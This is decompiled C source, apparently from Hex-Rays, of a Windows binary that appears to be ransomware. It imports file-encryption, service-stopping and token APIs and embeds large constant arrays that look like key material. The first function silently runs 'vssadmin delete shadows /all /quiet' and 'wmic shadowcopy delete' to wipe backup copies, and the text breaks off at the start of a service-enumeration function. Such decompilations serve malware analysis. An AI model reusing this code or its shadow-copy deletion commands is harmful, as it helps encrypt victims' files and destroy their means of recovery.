/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int sub_401000();
BOOL __stdcall sub_401200(LPCSTR lpServiceName, SC_HANDLE hSCManager);
int __cdecl sub_401490(LPCWSTR lpFileName); // idb
BOOL __thiscall sub_401910(HCRYPTKEY *this, const void *a2, DWORD pdwDataLen, BYTE **a4);
char __cdecl sub_4019A0(LPCWSTR lpFileName, int a2, LPWSTR FilePart);
int sub_401D60();
BOOL __thiscall sub_402000(HCRYPTPROV *phProv, LPCCH lpMultiByteStr);
int __cdecl sub_402150(int a1, unsigned int a2, int a3, int a4);
BYTE *__cdecl sub_402230(LPCWSTR lpSubKey, LPCWSTR lpValueName);
WCHAR *__cdecl sub_4022B0(LPCWSTR lpString);
unsigned __int64 __cdecl sub_402320(__int64 a1, unsigned int a2);
int __thiscall sub_402380(_DWORD *this, _BYTE *a2, _BYTE *a3, __int64 a4);
int __thiscall sub_402720(char *this, unsigned __int8 *a2, unsigned __int8 *a3);
_BYTE *__cdecl sub_4028E0(int a1, _BYTE *a2);
// void __usercall __noreturn start(int a1@<edi>, int a2@<esi>);
void __cdecl sub_403390(BYTE *pbBuffer, int dwLen);
unsigned int *__cdecl sub_403450(unsigned int *a1, unsigned __int8 *a2);
unsigned int *__cdecl sub_4070F0(_BYTE *a1, int a2);
_DWORD *__cdecl sub_407400(_DWORD *a1);
int __cdecl sub_4074B0(int a1, unsigned __int8 *a2, unsigned int a3);
void __cdecl sub_4075F0(void *a1, const void *a2, unsigned int a3);
unsigned __int64 __stdcall sub_407620(__int64 a1, __int64 a2);
// unsigned __int64 __usercall sub_407690@<edx:eax>(unsigned __int64 a1@<edx:eax>, unsigned __int8 a2@<cl>);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern BOOL (__stdcall *QueryServiceStatusEx)(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
// extern SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *EnumServicesStatusA)(SC_HANDLE hSCManager, DWORD dwServiceType, DWORD dwServiceState, LPENUM_SERVICE_STATUSA lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned, LPDWORD lpResumeHandle);
// extern BOOL (__stdcall *EnumDependentServicesA)(SC_HANDLE hService, DWORD dwServiceState, LPENUM_SERVICE_STATUSA lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned);
// extern BOOL (__stdcall *ControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern BOOL (__stdcall *CryptEncrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen);
// extern BOOL (__stdcall *CryptDestroyKey)(HCRYPTKEY hKey);
// extern BOOL (__stdcall *CryptAcquireContextW)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern LSTATUS (__stdcall *RegQueryValueExW)(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegOpenKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern BOOL (__stdcall *DuplicateTokenEx)(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);
// extern BOOL (__stdcall *CreateProcessAsUserW)(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern BOOL (__stdcall *GetUserNameW)(LPWSTR lpBuffer, LPDWORD pcbBuffer);
// extern BOOL (__stdcall *SetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern BOOL (__stdcall *CryptDecodeObjectEx)(DWORD dwCertEncodingType, LPCSTR lpszStructType, const BYTE *pbEncoded, DWORD cbEncoded, DWORD dwFlags, PCRYPT_DECODE_PARA pDecodePara, void *pvStructInfo, DWORD *pcbStructInfo);
// extern BOOL (__stdcall *CryptStringToBinaryW)(LPCWSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
// extern BOOL (__stdcall *CryptBinaryToStringA)(const BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPSTR pszString, DWORD *pcchString);
// extern BOOL (__stdcall *CryptImportPublicKeyInfo)(HCRYPTPROV hCryptProv, DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, HCRYPTKEY *phKey);
// extern DWORD (__stdcall *GetTickCount)();
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern LPWSTR (__stdcall *lstrcpyW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern HANDLE (__stdcall *CreateEventW)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern BOOL (__stdcall *CreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern void (__stdcall *GetStartupInfoW)(LPSTARTUPINFOW lpStartupInfo);
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern UINT (__stdcall *GetSystemDirectoryW)(LPWSTR lpBuffer, UINT uSize);
// extern UINT (__stdcall *GetWindowsDirectoryW)(LPWSTR lpBuffer, UINT uSize);
// extern DWORD (__stdcall *GetFullPathNameW)(LPCWSTR lpFileName, DWORD nBufferLength, LPWSTR lpBuffer, LPWSTR *lpFilePart);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *CopyFileW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, BOOL bFailIfExists);
// extern BOOL (__stdcall *MoveFileExW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, DWORD dwFlags);
// extern BOOL (__stdcall *GetVolumeInformationA)(LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
// extern BOOL (__stdcall *GetVolumeInformationW)(LPCWSTR lpRootPathName, LPWSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPWSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
// extern BOOL (__stdcall *GetComputerNameW)(LPWSTR lpBuffer, LPDWORD nSize);
// extern HANDLE (__stdcall *FindFirstVolumeA)(LPSTR lpszVolumeName, DWORD cchBufferLength);
// extern BOOL (__stdcall *FindNextVolumeA)(HANDLE hFindVolume, LPSTR lpszVolumeName, DWORD cchBufferLength);
// extern BOOL (__stdcall *FindVolumeClose)(HANDLE hFindVolume);
// extern BOOL (__stdcall *SetVolumeMountPointA)(LPCSTR lpszVolumeMountPoint, LPCSTR lpszVolumeName);
// extern BOOL (__stdcall *GetVolumePathNamesForVolumeNameA)(LPCSTR lpszVolumeName, LPCH lpszVolumePathNames, DWORD cchBufferLength, PDWORD lpcchReturnLength);
// extern DWORD (__stdcall *WTSGetActiveConsoleSessionId)();
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern int (__stdcall *GetLocaleInfoW)(LCID Locale, LCTYPE LCType, LPWSTR lpLCData, int cchData);
// extern void (__stdcall *GetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *DeviceIoControl)(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *GetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// extern BOOL (__stdcall *UnlockFile)(HANDLE hFile, DWORD dwFileOffsetLow, DWORD dwFileOffsetHigh, DWORD nNumberOfBytesToUnlockLow, DWORD nNumberOfBytesToUnlockHigh);
// extern BOOL (__stdcall *LockFile)(HANDLE hFile, DWORD dwFileOffsetLow, DWORD dwFileOffsetHigh, DWORD nNumberOfBytesToLockLow, DWORD nNumberOfBytesToLockHigh);
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern DWORD (__stdcall *GetLastError)();
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *SHGetSpecialFolderPathW)(HWND hwnd, LPWSTR pszPath, int csidl, BOOL fCreate);
// extern PSTR (__stdcall *StrStrIA)(PCSTR pszFirst, PCSTR pszSrch);
// extern LPWSTR (__stdcall *PathFindExtensionW)(LPCWSTR pszPath);
// extern int (__stdcall *StrToIntA)(PCSTR pszSrc);
// extern int (*wsprintfA)(LPSTR, LPCSTR, ...);
// extern int (*wsprintfW)(LPWSTR, LPCWSTR, ...);
unsigned __int8 byte_4086A8[64] =
{
  125u,
  176u,
  161u,
  106u,
  45u,
  163u,
  188u,
  199u,
  246u,
  144u,
  165u,
  201u,
  216u,
  109u,
  22u,
  174u,
  255u,
  180u,
  231u,
  115u,
  236u,
  210u,
  29u,
  25u,
  36u,
  134u,
  120u,
  49u,
  199u,
  251u,
  40u,
  214u,
  73u,
  114u,
  85u,
  235u,
  143u,
  127u,
  59u,
  162u,
  138u,
  17u,
  176u,
  219u,
  138u,
  72u,
  58u,
  52u,
  73u,
  195u,
  134u,
  99u,
  124u,
  134u,
  32u,
  8u,
  5u,
  110u,
  199u,
  233u,
  89u,
  190u,
  47u,
  34u
}; // weak
_UNKNOWN unk_408770; // weak
int dword_408970 = 0; // weak
int dword_40A000; // weak
LPCVOID lpBuffer; // idb
LPCVOID dword_40A008; // idb
WCHAR FileName; // idb
WCHAR String1; // idb
WCHAR String2; // idb
BYTE pbBuffer[32]; // weak
char byte_40A330; // weak
char byte_40A331; // weak
__int16 word_40A332; // weak
_UNKNOWN unk_40A334; // weak
_UNKNOWN unk_40A335; // weak
__int16 word_40A336; // weak
BYTE byte_40A338[3272]; // weak
char aFjtqrhKYQq15k7[65] = "FJTQRH]k(!Y<QQ15K:7)V1s(:DYW6pLCRC)dHC4zIYA)nW\"y ,qiy`&v])`Ib}>M"; // weak
int dword_40B048[18] =
{
  315630488,
  779468219,
  -1722296384,
  -1388665214,
  1796331870,
  824123040,
  1566720283,
  -1682721720,
  -1672661066,
  -360790772,
  -1039122989,
  368169137,
  1421611676,
  -197141193,
  65593440,
  -1812995977,
  0,
  0
}; // weak
int dword_40B090[113] =
{
  2043375495,
  252168608,
  -1406030663,
  -1573748555,
  1212061742,
  676594369,
  554315605,
  -1866085056,
  -331009812,
  -1234245590,
  -904565367,
  1736824822,
  1941729269,
  -700603321,
  180927496,
  -1298294691,
  1305180762,
  1941734190,
  739295949,
  -1243102910,
  -261300635,
  897897351,
  -1678482623,
  -1755390368,
  -553949052,
  -16808188,
  -1936056615,
  -1244694775,
  78791302,
  2144053790,
  -802609025,
  -854753839,
  1061669975,
  -832794146,
  771622809,
  -5155937,
  1408443866,
  772925155,
  -80634881,
  -1876668161,
  -620115374,
  -1839690086,
  2119010888,
  513220687,
  -1008720597,
  -1426599147,
  -1786188672,
  2134101482,
  1532135700,
  -860667953,
  1776789908,
  -726074036,
  1196035390,
  216249741,
  -2013052213,
  620136645,
  695397908,
  1153120439,
  1009153945,
  1507962288,
  1028909043,
  -2091885509,
  2140127232,
  583324963,
  1881190532,
  -2094958821,
  -1333783030,
  -483195396,
  1034947535,
  555850004,
  -1367894163,
  494702027,
  147184429,
  893062591,
  -1839118390,
  -561813621,
  -1979922183,
  2045483496,
  821213171,
  2095252769,
  -1138035062,
  1956633624,
  -567446908,
  2037647531,
  1088121461,
  -1410606094,
  512747138,
  -1798618686,
  -2121225091,
  223388686,
  1862586097,
  -995863920,
  2141043632,
  -1523131189,
  -1511842809,
  -319668737,
  492592272,
  1510058738,
  -2054695790,
  257411946,
  -1852924510,
  307278092,
  -1838774587,
  -118056038,
  -688120569,
  1585442816,
  303715738,
  -1339369732,
  1867691923,
  1983717393,
  947338551,
  951640957,
  14603942
}; // weak
CHAR pszSrc[] = "93ww"; // idb
int dword_40B260[256] =
{
  2023043548,
  1680800510,
  -2005104739,
  -2041400959,
  1847248904,
  1779041259,
  527395336,
  -1125977563,
  -869851929,
  -1418403796,
  -2044581742,
  1369609453,
  1591104453,
  -233599895,
  552003701,
  -1615416199,
  1659326993,
  1990107921,
  573374432,
  -1241784763,
  -1016665218,
  652070588,
  -389798318,
  75,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
CHAR a3629[] = "3629"; // idb
int dword_40B668[512] =
{
  1959158410,
  1751296941,
  -600718640,
  -882974016,
  760584269,
  626593720,
  1277174360,
  -106453975,
  -1909763674,
  -29383827,
  -747494206,
  1133496225,
  311772872,
  -935610282,
  63755802,
  -1535081123,
  1120368755,
  150005599,
  1836424346,
  -207517885,
  -1658539467,
  1742443769,
  -1148485863,
  -365386496,
  -1315343397,
  -72222619,
  -403483968,
  -761317876,
  1207828686,
  110027783,
  -1217103822,
  -865985140,
  593332267,
  -1137117024,
  1368882905,
  -525585927,
  1320051868,
  1014268588,
  -2139563130,
  -566411553,
  -1072004269,
  -682962458,
  303364118,
  2061057024,
  -2105182611,
  -779305720,
  -829230359,
  940218540,
  1128366093,
  -893648671,
  1171886521,
  -1795888571,
  84541989,
  834903940,
  -364943110,
  330299025,
  693893392,
  2112567994,
  342125964,
  1962059157,
  1596185284,
  -60333511,
  1458500104,
  886948157,
  1359143376,
  -1828638385,
  -1785127144,
  -1305263916,
  2141791940,
  1342885637,
  -162352318,
  1545047001,
  502648136,
  370628505,
  -1519559710,
  -441167205,
  -930438745,
  1874053794,
  2122569131,
  361892425,
  -1469739024,
  602847086,
  -1472371221,
  423382745,
  394334769,
  -544877379,
  1608839668,
  -1097792375,
  -1814240976,
  2116744027,
  2102705291,
  -588430715,
  701082321,
  -800157279,
  -1248981644,
  -253592439,
  813328001,
  909672655,
  -1484609386,
  1863251837,
  -1561726470,
  238668398,
  -394264668,
  -1970693495,
  -1247736025,
  889494382,
  354252274,
  -550645253,
  358144503,
  358303854,
  1461073758,
  1069540366,
  939446689,
  -1067966753,
  178647887,
  -1059099652,
  981985104,
  -585968355,
  -1179448215,
  1896938213,
  -567208717,
  -757685038,
  -225225619,
  -578995629,
  201957266,
  -36556198,
  -1602097305,
  1851543116,
  -780011443,
  873167048,
  1871972580,
  -1993634555,
  -1813171062,
  -278883190,
  -364208501,
  1807969681,
  2136034750,
  689798640,
  -1399355959,
  -1891285287,
  1119263849,
  -892016523,
  -1020526516,
  1431071271,
  -220185447,
  2132855311,
  -610533564,
  -606024128,
  -1465839600,
  -450155647,
  -960804118,
  -357076845,
  -1586218076,
  1858662646,
  1252851235,
  -50840553,
  -588026273,
  -281575913,
  -1086570709,
  -2104741519,
  -19047294,
  -566141482,
  2035684716,
  1560389626,
  -517955966,
  1139629559,
  326343561,
  1157352085,
  -1337912265,
  1560440552,
  939227929,
  -1841753074,
  -1579418694,
  1007074617,
  -1953417647,
  2130099846,
  1228742256,
  -1081961174,
  -932529188,
  -1630411430,
  -944174567,
  -1907946567,
  -1541652368,
  246147937,
  634937047,
  -532116319,
  -1512290391,
  1941901723,
  -1434625175,
  -1206006898,
  910649388,
  -740404052,
  2077002334,
  -1605835014,
  -362516219,
  2065416565,
  21056357,
  935105699,
  -1034396981,
  441391405,
  1711848967,
  -828238814,
  319146163,
  -834601520,
  507242284,
  -852113974,
  -1064447971,
  -1813525794,
  -1634832170,
  -1956231010,
  295851641,
  1171669422,
  -1288111921,
  1736831792,
  1154414091,
  -879821446,
  -21193947,
  -1358882346,
  377305804,
  1425057448,
  118451920,
  722781622,
  1204207993,
  1784329984,
  -1525274266,
  33103181,
  109514749,
  -1306393130,
  1203188167,
  -1460534558,
  -1007848547,
  272894598,
  1751786038,
  1017559516,
  130486783,
  2146865538,
  746017917,
  -565849002,
  878336145,
  -301800598,
  -1359647126,
  -2126166704,
  409795834,
  1601536898,
  -331245068,
  1612044369,
  -925618354,
  -1035713931,
  -1254122942,
  -2063978752,
  -892302041,
  120036101,
  2090628667,
  826644647,
  2029251814,
  -872084512,
  546451876,
  -1396823630,
  -1914265431,
  -338170519,
  -1570998817,
  -1881377386,
  469013192,
  -551028859,
  -1991239226,
  141316149,
  -1517253706,
  -2060739289,
  -831750964,
  -353520482,
  712875193,
  -1628538493,
  -853669979,
  -1749430626,
  609937693,
  120166531,
  406919021,
  1159754463,
  1287399701,
  -1626554286,
  968320489,
  1775255426,
  1274280310,
  -1478946267,
  1533880377,
  1306612516,
  1005814377,
  679143855,
  1229616288,
  229882449,
  1241827829,
  1431591005,
  760739332,
  240808160,
  240765244,
  -210104180,
  -1606733747,
  -1493879323,
  937072426,
  -405252238,
  484641890,
  -288968399,
  -1026108453,
  752315091,
  1877803846,
  -935377024,
  -936566813,
  -137170731,
  -1740932508,
  635172624,
  -16784243,
  854969596,
  -719074293,
  -1853252514,
  192345491,
  1696051457,
  1749214733,
  583286594,
  139972078,
  1343208291,
  1297415787,
  -1564034434,
  903905269,
  -833813394,
  1971822342,
  1689745654,
  2097148199,
  -801794845,
  -524183914,
  -638836893,
  -2142233329,
  -1982794174,
  1139581741,
  943842961,
  992071639,
  -125698197,
  -695562006,
  443251434,
  2122455330,
  -2050143765,
  -524731834,
  1142005989,
  2011810054,
  -1389481325,
  -2095637586,
  579724208,
  935663376,
  -825605890,
  -460377640,
  -1989425767,
  1047910112,
  -930369692,
  -1884310771,
  -1154726810,
  319611189,
  -83889657,
  1780093927,
  686796172,
  -1656856767,
  -1436123818,
  -1149154183,
  1174868031,
  -1211777922,
  2086984993,
  1343980442,
  696108994,
  1418356392,
  -805420556,
  581976541,
  1611165919,
  -943677832,
  -620942277,
  -1318454501,
  1805034111,
  179327521,
  703309906,
  16838404,
  -1878475794,
  -207551053,
  519454278,
  -3471090,
  1176123249,
  450203279,
  -1289668278,
  -14233944,
  265524203,
  -80312917,
  657493124,
  -2109156101,
  -444535093,
  -586522950,
  1288692576,
  889253727,
  -1703397686,
  -391766672,
  -1663869625,
  -1754107678,
  1036320300,
  1045817311,
  -754915007,
  1011678661,
  -237815069,
  -666715132,
  -1109742262,
  -499514973,
  1902604387,
  -543767935,
  -1262105540,
  -1376164018,
  -677530606,
  -1572925893,
  -1399343485,
  -1295346327,
  2008207692,
  1541680268,
  -100833046,
  -1770125506,
  -1906475047,
  -1418358508,
  -1522225505,
  1479770067,
  -440697308,
  2142860749,
  831971945,
  1994481772,
  423328379,
  1039723257,
  663171885,
  1184072900,
  2127134424,
  1632614539,
  -486781049,
  -353135704,
  -1460484639,
  -306015347,
  -2132464872,
  1297851813,
  1715770553,
  1444555515,
  -2074437461,
  1463468078,
  -1182322992,
  -368465576,
  -1616802225,
  -1332430435,
  296961264,
  1748748634,
  -2020137295,
  890297789,
  -1705110783,
  1977592160,
  1497418896,
  -1667573107,
  -445611552,
  -1266521420,
  811435426,
  1225532519,
  683730857,
  -40007103,
  -1356230000,
  88152003,
  -1890173293,
  1140819322,
  911634379,
  559825803,
  -413329433,
  -587722170,
  -731300276,
  1190061678,
  535924008,
  325119443,
  610430803,
  1437007783,
  -435752075,
  858513167,
  -1460985518,
  1889223420,
  1424168642,
  1523227284,
  -477896307,
  -158337667,
  1191985648,
  194321711,
  -2117369867,
  -2083722107,
  -1388959004,
  1470258051,
  671540363,
  2125804474,
  1923229769,
  1785585368,
  1604822175,
  -643342719,
  -634318924,
  1138952565,
  -1695887795,
  -257162582,
  1360962321,
  190298501,
  -1015785717,
  1790344030,
  1110627621,
  -1712853619,
  67794398,
  891465923,
  510606093,
  -1341320132,
  -2140302310,
  -1421223360,
  -2135773471,
  -1778577012,
  1849669553
}; // weak


//----- (00401000) --------------------------------------------------------
int sub_401000()
{
  HMODULE LibraryW; // eax
  BOOLEAN (__stdcall *Wow64EnableWow64FsRedirection)(BOOLEAN); // eax
  HMODULE v2; // eax
  BOOLEAN (__stdcall *ProcAddress)(BOOLEAN); // eax
  struct _STARTUPINFOW StartupInfo; // [esp+0h] [ebp-F8h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [esp+44h] [ebp-B4h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+68h] [ebp-90h] BYREF
  int v8[18]; // [esp+78h] [ebp-80h] BYREF
  WCHAR CommandLine[28]; // [esp+C0h] [ebp-38h] BYREF

  GetNativeSystemInfo(&SystemInfo);
  if ( SystemInfo.wProcessorArchitecture == 9 )
  {
    LibraryW = LoadLibraryW(L"kernel32.dll");
    Wow64EnableWow64FsRedirection = (BOOLEAN (__stdcall *)(BOOLEAN))GetProcAddress(
                                                                      LibraryW,
                                                                      "Wow64EnableWow64FsRedirection");
    Wow64EnableWow64FsRedirection(0);
  }
  GetStartupInfoW(&StartupInfo);
  StartupInfo.wShowWindow = 0;
  StartupInfo.dwFlags = 1;
  wcscpy((wchar_t *)v8, L"vssadmin delete shadows /all /quiet");
  wcscpy(CommandLine, L"wmic.exe shadowcopy delete");
  CreateProcessW(0, CommandLine, 0, 0, 0, 0x20u, 0, 0, &StartupInfo, &ProcessInformation);
  CloseHandle(ProcessInformation.hProcess);
  CloseHandle(ProcessInformation.hThread);
  WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
  CreateProcessW(0, (LPWSTR)v8, 0, 0, 0, 0x20u, 0, 0, &StartupInfo, &ProcessInformation);
  WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
  CloseHandle(ProcessInformation.hProcess);
  CloseHandle(ProcessInformation.hThread);
  if ( SystemInfo.wProcessorArchitecture == 9 )
  {
    v2 = LoadLibraryW(L"kernel32.dll");
    ProcAddress = (BOOLEAN (__stdcall *)(BOOLEAN))GetProcAddress(v2, "Wow64EnableWow64FsRedirection");
    ProcAddress(1);
  }
  return 1;
}

//----- (00401200) --------------------------------------------------------
BOOL __stdcall sub_401200(LPCSTR lpServiceName, SC_HANDLE hSCManager)
{
  SC_HANDLE v2; // eax
  void (__stdcall *v4)(DWORD); // esi
  DWORD v5; // edx
  HANDLE ProcessHeap; // eax
  struct _ENUM_SERVICE_STATUSA *v7; // eax
  HANDLE v8; // eax
  __m128i *v9; // eax
  SC_HANDLE v10; // esi
  HANDLE v11; // eax
  DWORD v12; // [esp-8h] [ebp-9Ch]
  void *v13; // [esp-8h] [ebp-9Ch]
  void *v14; // [esp-8h] [ebp-9Ch]
  struct _SERVICE_STATUS ServiceStatus; // [esp+2Ch] [ebp-68h] BYREF
  struct _SERVICE_STATUS Buffer; // [esp+50h] [ebp-44h] BYREF
  DWORD v17; // [esp+74h] [ebp-20h]
  DWORD TickCount; // [esp+78h] [ebp-1Ch]
  DWORD pcbBytesNeeded; // [esp+7Ch] [ebp-18h] BYREF
  char *v20; // [esp+80h] [ebp-14h]
  DWORD v21; // [esp+84h] [ebp-10h]
  LPVOID lpMem; // [esp+88h] [ebp-Ch]
  DWORD ServicesReturned; // [esp+8Ch] [ebp-8h] BYREF
